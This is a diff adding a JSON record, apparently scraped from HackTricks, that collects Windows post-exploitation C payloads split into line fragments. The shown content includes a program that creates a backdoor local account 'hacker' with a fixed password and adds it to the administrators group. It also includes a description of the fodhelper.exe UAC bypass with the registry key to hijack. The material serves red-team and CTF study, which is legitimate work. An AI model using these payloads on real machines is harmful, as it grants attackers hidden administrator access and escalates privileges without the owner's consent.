@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_459e24245157",
+  "category": "windows-hardening",
+  "title": "windows c payloads",
+  "description": "# Windows C Payloads\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThis page collects **small, self-contained C snippets** that are handy during Windows Local Privilege Escalation or post-exploitation.  Each payload is designed to be **copy-paste friendly**, requires only the Windows API / C runtime, and can be compiled with `i686-w64-mingw32-gcc` (x86) or `x86_64-w64-mingw32-gcc` (x64).\n\n> \u26a0\ufe0f  These payloads assume that the process already has the minimum privileges necessary to perform t",
+  "payloads": [
+    "# Windows C Payloads",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "This page collects **small, self-contained C snippets** that are handy during Windows Local Privilege Escalation or post-exploitation.  Each payload is designed to be **copy-paste friendly**, requires only the Windows API / C runtime, and can be compiled with `i686-w64-mingw32-gcc` (x86) or `x86_64-w64-mingw32-gcc` (x64).",
+    "> \u26a0\ufe0f  These payloads assume that the process already has the minimum privileges necessary to perform the action (e.g. `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity context for a UAC bypass).  They are intended for **red-team or CTF settings** where exploiting a vulnerability has landed arbitrary native code execution.",
+    "## Add local administrator user",
+    "// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c",
+    "#include <stdlib.h>",
+    "int main(void) {",
+    "system(\"net user hacker Hacker123! /add\");",
+    "system(\"net localgroup administrators hacker /add\");",
+    "return 0;",
+    "## UAC Bypass \u2013 `fodhelper.exe` Registry Hijack (Medium \u2192 High integrity)",
+    "When the trusted binary **`fodhelper.exe`** is executed, it queries the registry path below **without filtering the `DelegateExecute` verb**.  By planting our command under that key an attacker can bypass UAC *without* dropping a file to disk.",
+    "*Registry path queried by `fodhelper.exe`*",
+    "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/windows-local-privilege-escalation/windows-c-payloads.md"
+  ]
+}
